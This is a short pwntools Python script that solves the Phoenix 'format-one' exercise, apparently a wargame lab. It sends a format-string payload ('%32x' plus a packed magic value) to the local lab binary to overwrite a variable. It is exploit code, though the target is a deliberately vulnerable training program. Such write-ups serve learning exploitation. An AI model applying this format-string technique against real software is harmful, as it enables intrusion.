#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/format-one"
context.binary = path

io = process(path)
print(io.recvline().decode("ascii"))
io.sendline(b"%32x" + pack(0x45764F6C))
print(io.recvline().decode("ascii"))
